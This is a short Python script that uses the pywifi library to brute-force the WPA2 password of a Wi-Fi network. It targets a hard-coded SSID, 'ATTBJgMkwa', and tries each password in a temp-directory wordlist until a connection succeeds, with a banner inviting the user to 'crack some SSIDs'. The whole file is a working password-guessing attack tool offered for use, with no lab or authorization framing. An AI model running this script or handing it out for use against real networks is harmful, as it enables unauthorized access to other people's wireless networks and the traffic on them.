import time
import pywifi
from pywifi import const
import os
import tempfile

def get_pass_file_path():
    temp_dir = tempfile.gettempdir()
    pass_file_path = os.path.join(temp_dir, 'pass.txt')
    return pass_file_path

def connect_to_network(iface, ssid, key=None):
    iface.remove_all_network_profiles()
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    if key:
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = key
    iface.add_network_profile(profile)
    iface.connect(profile)
    time.sleep(4)
    return iface.status() == const.IFACE_CONNECTED

wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]

selected_ssid = "ATTBJgMkwa"  # Replace 'YOUR_SSID_HERE' with the SSID you want to crack.

print("\033[36m\nWelcome, \033[35mGamer.\n\n\033[36mLet's try to crack some SSIDs!\n\n\033[33mChecking if SSID has password...\033[37m")

interface.scan()
time.sleep(5)

scan_results = interface.scan_results()
available_devices = [(result.ssid, result.bssid) for result in scan_results]

pass_file_path = get_pass_file_path()

with open(pass_file_path, 'r') as f:
    keys = [line.strip() for line in f]

final_output = {}

for ssid, mac_address in available_devices:
    if ssid == selected_ssid:
        if connect_to_network(interface, ssid):
            print('\033[32m\nSuccess! Password of the network', ssid, 'is "none\033[37m')
            final_output[ssid] = ""
        else:
            print('\033[31mFailed to connect to the network', ssid+"\033[37m")

        for key in keys:
            if connect_to_network(interface, ssid, key):
                print('\033[32m\nSuccess! Password of the network', ssid, 'is\033[36m', key+"\033[37m")
                input("Press Enter to Quit.")
                final_output[ssid] = key
                break
            else:
                print('\033[33mTrying password:', key+"\033[37m")
        else:
            print('\033[31mFailed to crack the password of the network\033[37m', ssid)

        break 

print("\n" + '*' * 10, 'Discovered Password', '*' * 10)
print("{0:<12} {1:<}".format("SSID", "PASSWORD"))
for ssid, key in final_output.items():
    print("{:<12}|{:<12}".format(ssid, key))
